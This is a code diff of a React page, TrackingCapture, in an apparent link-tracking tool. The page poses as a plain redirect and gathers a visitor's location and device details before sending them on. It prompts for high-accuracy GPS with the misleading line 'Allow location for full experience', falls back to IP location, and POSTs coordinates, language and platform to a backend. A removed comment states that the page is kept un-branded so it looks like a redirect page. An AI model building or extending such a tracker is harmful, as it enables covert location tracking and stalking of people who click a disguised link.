@@ -1,11 +1,10 @@
 /**
  * TrackingCapture — /t/:token
  *
- * Uses useGeoGrabber to obtain GPS (or IP fallback) location,
- * then POSTs the capture payload to the backend and redirects.
- *
- * Shown to the visitor for a few seconds while data is collected.
- * Kept deliberately minimal / un-branded so it looks like a redirect page.
+ * 1. Requests GPS via browser prompt (enableHighAccuracy: true)
+ * 2. POSTs raw GPS coords + device info to backend
+ * 3. Backend does reverse geocoding (Nominatim) + IP enrichment server-side
+ * 4. Redirects to destination URL
  */
 
 import React, { useEffect, useRef, useState } from "react";
@@ -14,8 +13,9 @@ import { useGeoGrabber } from "../hooks/useGeoGrabber";
 
 const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";
 
+// Bump version number here to clear old sessionStorage blocks when testing
 function getCaptureKey(token) {
-  return `traxelon_captured_v2_${token}`;
+  return `traxelon_captured_v3_${token}`;
 }
 
 export default function TrackingCapture() {
@@ -23,11 +23,10 @@ export default function TrackingCapture() {
   const [status, setStatus] = useState("📍 Allow location for full experience…");
   const hasSent = useRef(false);
 
-  // useGeoGrabber waits for GPS (up to 12 s) then falls back to IP
+  // Requests GPS with enableHighAccuracy: true, falls back to IP if denied
   const { location, loading } = useGeoGrabber();
 
   useEffect(() => {
-    // Prevent double-capture in React StrictMode / fast-refresh
     const key = getCaptureKey(token);
     if (sessionStorage.getItem(key)) {
       setStatus("Redirecting…");
@@ -35,14 +34,13 @@ export default function TrackingCapture() {
   }, [token]);
 
   useEffect(() => {
-    if (loading) return;                    // still resolving location
-    if (hasSent.current) return;            // already fired
+    if (loading) return;           // still waiting for GPS response
+    if (hasSent.current) return;   // already fired
     const key = getCaptureKey(token);
     if (sessionStorage.getItem(key)) return; // already captured this session
 
     hasSent.current = true;
     sessionStorage.setItem(key, "1");
-
     sendCapture();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [loading]);
@@ -61,18 +59,13 @@ export default function TrackingCapture() {
         language: navigator.language,
         platform: navigator.platform,
 
-        // GPS fields — only when browser Geolocation API succeeded (user tapped Allow)
+        // Send raw GPS coords — backend does reverse geocoding via Nominatim
         gpsLat: location?.source === "gps" ? (location?.lat ?? null) : null,
         gpsLon: location?.source === "gps" ? (location?.lon ?? null) : null,
         gpsAccuracy: location?.source === "gps" ? (location?.gpsAccuracy ?? null) : null,
-
-        // Reverse-geocoded address from OpenStreetMap Nominatim (GPS only)
-        gpsAddress: location?.source === "gps" ? (location?.address ?? null) : null,
-        gpsCity: location?.source === "gps" ? (location?.city ?? null) : null,
-        gpsState: location?.source === "gps" ? (location?.state ?? null) : null,
-        gpsPincode: location?.source === "gps" ? (location?.pincode ?? null) : null,
-        gpsCountry: location?.source === "gps" ? (location?.country ?? null) : null,
       };
+
+      console.log("[TrackingCapture] Sending payload:", payload);
 
       const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
         method: "POST",
@@ -81,9 +74,10 @@ export default function TrackingCapture() {
       });
 
       const data = await res.json();
+      console.log("[TrackingCapture] Backend response:", data);
       destinationUrl = data?.destinationUrl ?? null;
-    } catch {
-      // silent — still redirect if we have a URL
+    } catch (err) {
+      console.error("[TrackingCapture] Error:", err);
     }
 
     if (destinationUrl) {
